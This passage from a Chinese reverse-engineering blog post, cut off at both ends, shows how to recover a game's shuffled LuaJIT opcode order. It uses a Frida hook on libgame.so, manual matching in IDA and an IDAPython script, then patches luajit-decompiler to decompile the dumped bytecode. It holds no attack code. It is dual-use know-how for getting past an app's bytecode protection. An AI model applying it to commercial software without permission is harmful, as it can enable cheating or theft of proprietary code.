dispatch 字段的地址差值，该值可在 IDA 中查看，为 0xF30：</p><p><img src="/img/article/20230402/GG_G2DISP.png" alt="GG_G2DISP"></p><p>因此，我们可以换一种顺序来理解上面的三条汇编。首先通过 GL 寄存器（x22）加上 0xF30 找到 dispatch 数组，该数组中每一项都是一个处理例程的指针（8 字节），元素的下标即为该处理例程对应的 opcode，在此基础上加上 <code>opcode * 8</code> 就能找到当前 opcode 的处理例程了。</p><p>另外，从 <code>lj_bc.h</code> 的 71 ~ 197 行我们可以得知 2.1.0-beta3 版的 LuaJIT 具有 97 种 opcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BCDEF(_) \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Comparison ops. ORDER OPR. */</span> \</span></span><br><span class="line"><span class="meta">  _(ISLT,var,___,var,lt) \</span></span><br><span class="line"><span class="meta">  _(ISGE,var,___,var,lt) \</span></span><br><span class="line"><span class="meta">  _(ISLE,var,___,var,le) \</span></span><br><span class="line"><span class="meta">  _(ISGT,var,___,var,le) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(ISEQV,var,___,var,eq) \</span></span><br><span class="line"><span class="meta">  _(ISNEV,var,___,var,eq) \</span></span><br><span class="line"><span class="meta">  ...  <span class="comment">// 篇幅原因，此处省略</span></span></span><br></pre></td></tr></table></figure><p>根据上述分析，我们可以编写 hook 脚本来读取这些处理例程在 so 中的地址：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> output = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> lib_base = Module.findBaseAddress(<span class="string">&quot;libgame.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">Interceptor.attach(lib_base.add(<span class="number">0xACFEF0</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!output) &#123;</span><br><span class="line">            <span class="keyword">var</span> GL = <span class="built_in">this</span>.context.x22;</span><br><span class="line">            <span class="keyword">var</span> dispatch = GL.add(<span class="number">0xF30</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">97</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">var</span> prog_ptr = dispatch.add(i * <span class="number">8</span>).readPointer();</span><br><span class="line">                <span class="built_in">console</span>.log(prog_ptr.sub(lib_base));</span><br><span class="line">            &#125;</span><br><span class="line">            output = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>得到全部 97 种 opcode 的处理例程地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">0xacdaf0</span><br><span class="line">0xacdb70</span><br><span class="line">0xacdbf0</span><br><span class="line">0xacdc70</span><br><span class="line">0xacdcf0</span><br><span class="line">0xacdd74</span><br><span class="line">0xacddf4</span><br><span class="line">0xacde44</span><br><span class="line">0xacde94</span><br><span class="line">0xacdf20</span><br><span class="line">0xacdfac</span><br><span class="line">0xacdff0</span><br><span class="line">0xace034</span><br><span class="line">0xace060</span><br><span class="line">0xace08c</span><br><span class="line">0xace0b0</span><br><span class="line">0xace0d0</span><br><span class="line">0xace0f0</span><br><span class="line">0xace120</span><br><span class="line">0xace160</span><br><span class="line">0xace1a0</span><br><span class="line">0xace1d8</span><br><span class="line">0xace210</span><br><span class="line">0xace234</span><br><span class="line">0xace258</span><br><span class="line">0xace278</span><br><span class="line">0xace2a8</span><br><span class="line">0xace2ec</span><br><span class="line">0xace334</span><br><span class="line">0xace348</span><br><span class="line">0xace3f0</span><br><span class="line">0xace458</span><br><span class="line">0xace4c8</span><br><span class="line">0xace534</span><br><span class="line">0xace5a0</span><br><span class="line">0xace614</span><br><span class="line">0xace65c</span><br><span class="line">0xace6d0</span><br><span class="line">0xace73c</span><br><span class="line">0xace7a8</span><br><span class="line">0xace81c</span><br><span class="line">0xace864</span><br><span class="line">0xace8d8</span><br><span class="line">0xace944</span><br><span class="line">0xace9b0</span><br><span class="line">0xacea24</span><br><span class="line">0xacea6c</span><br><span class="line">0xaceae0</span><br><span class="line">0xaceb28</span><br><span class="line">0xaceb74</span><br><span class="line">0xaceba8</span><br><span class="line">0xacec18</span><br><span class="line">0xacec80</span><br><span class="line">0xacecb4</span><br><span class="line">0xacece8</span><br><span class="line">0xaced24</span><br><span class="line">0xaced6c</span><br><span class="line">0xacedcc</span><br><span class="line">0xacee20</span><br><span class="line">0xacee38</span><br><span class="line">0xacee50</span><br><span class="line">0xaceedc</span><br><span class="line">0xacef70</span><br><span class="line">0xacefdc</span><br><span class="line">0xacf024</span><br><span class="line">0xacf0d4</span><br><span class="line">0xacf1d0</span><br><span class="line">0xacf260</span><br><span class="line">0xacf2f4</span><br><span class="line">0xacf35c</span><br><span class="line">0xacf36c</span><br><span class="line">0xacf3b4</span><br><span class="line">0xacf3c0</span><br><span class="line">0xacf47c</span><br><span class="line">0xacf4cc</span><br><span class="line">0xacf570</span><br><span class="line">0xacf62c</span><br><span class="line">0xacf6a4</span><br><span class="line">0xacf734</span><br><span class="line">0xacf7d0</span><br><span class="line">0xacf7ec</span><br><span class="line">0xacf878</span><br><span class="line">0xacf8fc</span><br><span class="line">0xacf918</span><br><span class="line">0xacf94c</span><br><span class="line">0xacf97c</span><br><span class="line">0xacf998</span><br><span class="line">0xacf9b0</span><br><span class="line">0xacf9d4</span><br><span class="line">0xacf9f4</span><br><span class="line">0xacfa10</span><br><span class="line">0xacfa50</span><br><span class="line">0xacfa80</span><br><span class="line">0xacfa80</span><br><span class="line">0xacfb04</span><br><span class="line">0xacfb08</span><br><span class="line">0xacfb50</span><br></pre></td></tr></table></figure><p>接下来就是一个比较枯燥的过程了，我们需要对照源码 <code>vm_arm64.dasc</code> 在 IDA 中手动标识出上方 97 个地址所对应的 opcode（暂时没有想到自动化的标注方法，如果你有想法，欢迎交流）。具体的做法是从第一个地址开始，在源码的 <em>build_ins</em> 函数里找到汇编代码一致的 case，而后修改函数名为 opcode 名称。</p><p>这里以第二个地址为例，在 IDA 中可以看到一条 CSEL 汇编指令：</p><p><img src="/img/article/20230402/BC_ISGE_ida.png" alt="BC_ISGE_ida"></p><p>对应到源码：</p><p><img src="/img/article/20230402/BC_ISGE_src.png" alt="BC_ISGE_ida"></p><p>所以该函数为 <em>BC_ISGE</em> 的处理例程，同时在 IDA 中修改函数名为 <strong>BC_ISGE</strong>。以此类推，手动修改其余 96 个函数的名称。此过程中应注意源码各个 case 的判断条件并主动展开部分宏定义，IDA 没有识别出来的例程应自行新建函数。最终的部分修改结果展示如下：</p><p><img src="/img/article/20230402/func_name_modified.png" alt="func_name_modified"></p><p>这样我们就将 opcode 的顺序找到了，下一步就该对之前 dump 下来的 luac64 文件进行反编译了。</p><h2 id="反编译-luac64-文件"><a href="#反编译-luac64-文件" class="headerlink" title="反编译 luac64 文件"></a>反编译 luac64 文件</h2><p>在 Github 上可以找到很多用于反编译 LuaJIT 字节码的工具，但是它们中的大多数对于 64 位 LuaJIT 的支持不是很好，普遍缺乏对于 <code>2-slot frame info</code> 模式的适配，在解析函数调用语句时会发生参数错位等的情况。</p><p>经过一系列尝试之后，我发现 <a href="https://github.com/Dr-MTN/luajit-decompiler">luajit-decompiler</a> 项目的反编译效果较为优秀，我们只需要在其基础上修改部分代码使其适配新 opcode 顺序即可。</p><p>首先将项目代码 clone 下来，修改 <code>ljd/rawdump/luajit/v2_1/luajit_opcode.py</code> 中对于 <strong>_OPCODES</strong> 变量的赋值。借助上一个板块的分析结果和 IDAPython 脚本进行格式化输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># run in IDA</span></span><br><span class="line">addrs = [</span><br><span class="line">    <span class="number">0xacdaf0</span>, <span class="number">0xacdb70</span>, <span class="number">0xacdbf0</span>, <span class="number">0xacdc70</span>, <span class="number">0xacdcf0</span>,</span><br><span class="line">    <span class="number">0xacdd74</span>, <span class="number">0xacddf4</span>, <span class="number">0xacde44</span>, <span class="number">0xacde94</span>, <span class="number">0xacdf20</span>,</span><br><span class="line">    <span class="number">0xacdfac</span>, <span class="number">0xacdff0</span>, <span class="number">0xace034</span>, <span class="number">0xace060</span>, <span class="number">0xace08c</span>,</span><br><span class="line">    <span class="number">0xace0b0</span>, <span class="number">0xace0d0</span>, <span class="number">0xace0f0</span>, <span class="number">0xace120</span>, <span class="number">0xace160</span>,</span><br><span class="line">    <span class="number">0xace1a0</span>, <span class="number">0xace1d8</span>, <span class="number">0xace210</span>, <span class="number">0xace234</span>, <span class="number">0xace258</span>,</span><br><span class="line">    <span class="number">0xace278</span>, <span class="number">0xace2a8</span>, <span class="number">0xace2ec</span>, <span class="number">0xace334</span>, <span class="number">0xace348</span>,</span><br><span class="line">    <span class="number">0xace3f0</span>, <span class="number">0xace458</span>, <span class="number">0xace4c8</span>, <span class="number">0xace534</span>, <span class="number">0xace5a0</span>,</span><br><span class="line">    <span class="number">0xace614</span>, <span class="number">0xace65c</span>, <span class="number">0xace6d0</span>, <span class="number">0xace73c</span>, <span class="number">0xace7a8</span>,</span><br><span class="line">    <span class="number">0xace81c</span>, <span class="number">0xace864</span>, <span class="number">0xace8d8</span>, <span class="number">0xace944</span>, <span class="number">0xace9b0</span>,</span><br><span class="line">    <span class="number">0xacea24</span>, <span class="number">0xacea6c</span>, <span class="number">0xaceae0</span>, <span class="number">0xaceb28</span>, <span class="number">0xaceb74</span>,</span><br><span class="line">    <span class="number">0xaceba8</span>, <span class="number">0xacec18</span>, <span class="number">0xacec80</span>, <span class="number">0xacecb4</span>, <span class="number">0xacece8</span>,</span><br><span class="line">    <span class="number">0xaced24</span>, <span class="number">0xaced6c</span>, <span class="number">0xacedcc</span>, <span class="number">0xacee20</span>, <span class="number">0xacee38</span>,</span><br><span class="line">    <span class="number">0xacee50</span>, <span class="number">0xaceedc</span>, <span class="number">0xacef70</span>, <span class="number">0xacefdc</span>, <span class="number">0xacf024</span>,</span><br><span class="line">    <span class="number">0xacf0d4</span>, <span class="number">0xacf1d0</span>, <span class="number">0xacf260</span>, <span class="number">0xacf2f4</span>, <span class="number">0xacf35c</span>,</span><br><span class="line">    <span class="number">0xacf36c</span>, <span class="number">0xacf3b4</span>, <span class="number">0xacf3c0</span>, <span class="number">0xacf47c</span>, <span class="number">0xacf4cc</span>,</span><br><span class="line">    <span class="number">0xacf570</span>, <span class="number">0xacf62c</span>, <span class="number">0xacf6a4</span>, <span class="number">0xacf734</span>, <span class="number">0xacf7d0</span>,</span><br><span class="line">    <span class="number">0xacf7ec</span>, <span class="number">0xacf878</span>, <span class="number">0xacf8fc</span>, <span class="number">0xacf918</span>, <span class="number">0xacf94c</span>,</span><br><span class="line">    <span class="number">0xacf97c</span>, <span class="number">0xacf998</span>, <span class="number">0xacf9b0</span>, <span class="number">0xacf9d4</span>, <span class="number">0xacf9f4</span>,</span><br><span class="line">    <span class="number">0xacfa10</span>, <span class="number">0xacfa50</span>, <span class="number">0xacfa80</span>, <span class="number">0xacfa80</span>, <span class="number">0xacfb04</span>,</span><br><span class="line">    <span class="number">0xacfb08</span>, <span class="number">0xacfb50</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> opcode <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>):</span><br><span class="line">    <span class="keyword">if</span> opcode == <span class="number">0x5C</span>:</span><br><span class="line">        bc_name = <span class="string">&quot;FUNCV&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bc_name = get_name(addrs[opcode])[<span class="number">3</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t(<span class="subst">&#123;<span class="built_in">hex</span>(opcode)&#125;</span>, instructions.<span class="subst">&#123;bc_name&#125;</span>)<span class="subst">&#123;<span class="string">&#x27;,&#x27;</span> <span class="keyword">if</span> opcode &lt; <span class="number">96</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里需要注意，从 addrs 数组中我们也可以发现，opcode 为 0x5C 和 0x5D 的处理例程地址相同。通过排除法，可以确定这两项只能是 BC_FUNCV 和 BC_IFUNCV，我们这里就暂时规定 0x5C 为 BC_FUNCV，0x5D 为 BC_IFUNCV。如果后续反编译过程出错，再调换二者的顺序。</p><p>运行后得到如下输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x0</span>, instructions.ISLT),</span><br><span class="line">(<span class="number">0x1</span>, instructions.ISGE),</span><br><span class="line">(<span class="number">0x2</span>, instructions.ISLE),</span><br><span class="line">(<span class="number">0x3</span>, instructions.ISGT),</span><br><span class="line">(<span class="number">0x4</span>, instructions.ISEQV),</span><br><span class="line">(<span class="number">0x5</span>, instructions.ISNEV),</span><br><span class="line">(<span class="number">0x6</span>, instructions.ISEQS),</span><br><span class="line">(<span class="number">0x7</span>, instructions.ISNES),</span><br><span class="line">(<span class="number">0x8</span>, instructions.ISEQN),</span><br><span class="line">(<span class="number">0x9</span>, instructions.ISNEN),</span><br><span class="line">(<span class="number">0xa</span>, instructions.ISEQP),</span><br><span class="line">(<span class="number">0xb</span>, instructions.ISNEP),</span><br><span class="line">(<span class="number">0xc</span>, instructions.KSTR),</span><br><span class="line">(<span class="number">0xd</span>, instructions.KCDATA),</span><br><span class="line">(<span class="number">0xe</span>, instructions.KSHORT),</span><br><span class="line">(<span class="number">0xf</span>, instructions.KNUM),</span><br><span class="line">(<span class="number">0x10</span>, instructions.KPRI),</span><br><span class="line">(<span class="number">0x11</span>, instructions.KNIL),</span><br><span class="line">(<span class="number">0x12</span>, instructions.ISTC),</span><br><span class="line">(<span class="number">0x13</span>, instructions.ISFC),</span><br><span class="line">(<span class="number">0x14</span>, instructions.IST),</span><br><span class="line">(<span class="number">0x15</span>, instructions.ISF),</span><br><span class="line">(<span class="number">0x16</span>, instructions.ISTYPE),</span><br><span class="line">(<span class="number">0x17</span>, instructions.ISNUM),</span><br><span class="line">(<span class="number">0x18</span>, instructions.MOV),</span><br><span class="line">(<span class="number">0x19</span>, instructions.NOT),</span><br><span class="line">(<span class="number">0x1a</span>, instructions.UNM),</span><br><span class="line">(<span class="number">0x1b</span>, instructions.LEN),</span><br><span class="line">(<span class="number">0x1c</span>, instructions.RETM),</span><br><span class="line">(<span class="number">0x1d</span>, instructions.RET),</span><br><span class="line">(<span class="number">0x1e</span>, instructions.RET0),</span><br><span class="line">(<span class="number">0x1f</span>, instructions.RET1),</span><br><span class="line">(<span class="number">0x20</span>, instructions.ADDVN),</span><br><span class="line">(<span class="number">0x21</span>, instructions.SUBVN),</span><br><span class="line">(<span class="number">0x22</span>, instructions.MULVN),</span><br><span class="line">(<span class="number">0x23</span>, instructions.DIVVN),</span><br><span class="line">(<span class="number">0x24</span>, instructions.MODVN),</span><br><span class="line">(<span class="number">0x25</span>, instructions.ADDNV),</span><br><span class="line">(<span class="number">0x26</span>, instructions.SUBNV),</span><br><span class="line">(<span class="number">0x27</span>, instructions.MULNV),</span><br><span class="line">(<span class="number">0x28</span>, instructions.DIVNV),</span><br><span class="line">(<span class="number">0x29</span>, instructions.MODNV),</span><br><span class="line">(<span class="number">0x2a</span>, instructions.ADDVV),</span><br><span class="line">(<span class="number">0x2b</span>, instructions.SUBVV),</span><br><span class="line">(<span class="number">0x2c</span>, instructions.MULVV),</span><br><span class="line">(<span class="number">0x2d</span>, instructions.DIVVV),</span><br><span class="line">(<span class="number">0x2e</span>, instructions.MODVV),</span><br><span class="line">(<span class="number">0x2f</span>, instructions.POW),</span><br><span class="line">(<span class="number">0x30</span>, instructions.CAT),</span><br><span class="line">(<span class="number">0x31</span>, instructions.UGET),</span><br><span class="line">(<span class="number">0x32</span>, instructions.USETV),</span><br><span class="line">(<span class="number">0x33</span>, instructions.USETS),</span><br><span class="line">(<span class="number">0x34</span>, instructions.USETN),</span><br><span class="line">(<span class="number">0x35</span>, instructions.USETP),</span><br><span class="line">(<span class="number">0x36</span>, instructions.UCLO),</span><br><span class="line">(<span class="number">0x37</span>, instructions.FNEW),</span><br><span class="line">(<span class="number">0x38</span>, instructions.TNEW),</span><br><span class="line">(<span class="number">0x39</span>, instructions.TDUP),</span><br><span class="line">(<span class="number">0x3a</span>, instructions.GGET),</span><br><span class="line">(<span class="number">0x3b</span>, instructions.GSET),</span><br><span class="line">(<span class="number">0x3c</span>, instructions.TGETV),</span><br><span class="line">(<span class="number">0x3d</span>, instructions.TGETS),</span><br><span class="line">(<span class="number">0x3e</span>, instructions.TGETB),</span><br><span class="line">(<span class="number">0x3f</span>, instructions.TGETR),</span><br><span class="line">(<span class="number">0x40</span>, instructions.TSETV),</span><br><span class="line">(<span class="number">0x41</span>, instructions.TSETS),</span><br><span class="line">(<span class="number">0x42</span>, instructions.TSETB),</span><br><span class="line">(<span class="number">0x43</span>, instructions.TSETM),</span><br><span class="line">(<span class="number">0x44</span>, instructions.TSETR),</span><br><span class="line">(<span class="number">0x45</span>, instructions.CALLM),</span><br><span class="line">(<span class="number">0x46</span>, instructions.CALL),</span><br><span class="line">(<span class="number">0x47</span>, instructions.CALLMT),</span><br><span class="line">(<span class="number">0x48</span>, instructions.CALLT),</span><br><span class="line">(<span class="number">0x49</span>, instructions.ITERC),</span><br><span class="line">(<span class="number">0x4a</span>, instructions.ITERN),</span><br><span class="line">(<span class="number">0x4b</span>, instructions.VARG),</span><br><span class="line">(<span class="number">0x4c</span>, instructions.ISNEXT),</span><br><span class="line">(<span class="number">0x4d</span>, instructions.FORI),</span><br><span class="line">(<span class="number">0x4e</span>, instructions.JFORI),</span><br><span class="line">(<span class="number">0x4f</span>, instructions.FORL),</span><br><span class="line">(<span class="number">0x50</span>, instructions.IFORL),</span><br><span class="line">(<span class="number">0x51</span>, instructions.JFORL),</span><br><span class="line">(<span class="number">0x52</span>, instructions.ITERL),</span><br><span class="line">(<span class="number">0x53</span>, instructions.IITERL),</span><br><span class="line">(<span class="number">0x54</span>, instructions.JITERL),</span><br><span class="line">(<span class="number">0x55</span>, instructions.LOOP),</span><br><span class="line">(<span class="number">0x56</span>, instructions.ILOOP),</span><br><span class="line">(<span class="number">0x57</span>, instructions.JLOOP),</span><br><span class="line">(<span class="number">0x58</span>, instructions.JMP),</span><br><span class="line">(<span class="number">0x59</span>, instructions.FUNCF),</span><br><span class="line">(<span class="number">0x5a</span>, instructions.IFUNCF),</span><br><span class="line">(<span class="number">0x5b</span>, instructions.JFUNCF),</span><br><span class="line">(<span class="number">0x5c</span>, instructions.FUNCV),</span><br><span class="line">(<span class="number">0x5d</span>, instructions.IFUNCV),</span><br><span class="line">(<span class="number">0x5e</span>, instructions.JFUNCV),</span><br><span class="line">(<span class="number">0x5f</span>, instructions.FUNCC),</span><br><span class="line">(<span class="number">0x60</span>, instructions.FUNCCW)</span><br></pre></td></tr></table></figure><p>将其覆盖到 <strong>_OPCODES</strong> 元组完成第一处修改。</p><p>第二处修改在 <code>ljd/bytecode/instructions.py</code>，我们需要修正从第 97 行开始的对于每条指令的定义顺序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span 